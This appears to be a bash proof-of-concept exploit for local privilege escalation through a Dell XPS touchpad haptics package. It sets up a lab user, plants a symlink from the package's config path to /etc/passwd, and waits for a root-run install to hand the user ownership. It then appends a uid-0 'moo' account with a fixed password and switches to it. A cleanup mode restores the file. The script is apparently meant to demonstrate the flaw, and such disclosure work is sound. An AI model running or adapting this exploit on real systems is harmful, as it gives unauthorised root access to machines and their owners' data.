#!/usr/bin/env bash
set -euo pipefail
user=researcher
home=/home/researcher
config="$home/.config/omarchy/dell-haptic.conf"
backup=/root/passwd.moo-backup
log=/tmp/moo-package-event.log
done_file=/tmp/moo-package-event.done
print_cow() {
  cat <<'COW'
       /)       (\
  .-._((,~"~.))_.-,
   `-.   e   e   ,-'
      / ,o---o. \
     ( ( .___. ) )
      ) `-----' (
     /`-.__ __.-'\'
COW
}
case "${1:-setup}" in
setup)
  [[ $EUID == 0 ]] || exit 1
  id "$user" >/dev/null 2>&1 || useradd -m -s /bin/bash "$user"
  mkdir -p "$home/.config/omarchy"
  chown -R "$user:$user" "$home/.config"
  rm -f -- "$config" "$log" "$done_file" "$backup"
  cp -a -- /etc/passwd "$backup"
  chown root:root /etc/passwd
  print_cow
  pacman -Q dell-xps-touchpad-haptics
  stat -c 'BEFORE path=%n owner=%U group=%G uid=%u gid=%g mode=%A' /etc/passwd
  (
    sleep 8
    umask 022
    OMARCHY_HAPTIC_USER="$user" pacman -S --noconfirm dell-xps-touchpad-haptics >"$log" 2>&1 || true
    touch "$done_file"
  ) &
  sleep 2
  exec runuser -u "$user" -- bash "$0" attacker
  ;;
attacker)
  [[ $EUID != 0 ]] || exit 1
  id
  ln -s /etc/passwd "$config"
  ls -l -- "$config"
  while [[ ! -e $done_file ]]; do sleep 1; done
  cat "$log"
  stat -c 'AFTER path=%n owner=%U group=%G uid=%u gid=%g mode=%A' /etc/passwd
  [[ $(stat -c '%u' /etc/passwd) == "$EUID" ]]
  hash=$(openssl passwd -6 -salt moo piratemoo)
  printf 'moo:%s:0:0:moo:/root:/bin/bash\n' "$hash" >>/etc/passwd
  exec su - moo
  ;;
cleanup)
  [[ $EUID == 0 ]] || exit 1
  cp -a -- "$backup" /etc/passwd
  rm -f -- "$backup" "$config" "$log" "$done_file"
  chown -R "$user:$user" "$home/.config"
  stat -c 'RESTORED path=%n owner=%U group=%G uid=%u gid=%g mode=%A' /etc/passwd
  ! getent passwd moo >/dev/null
  ;;
*)
  exit 2
  ;;
esac
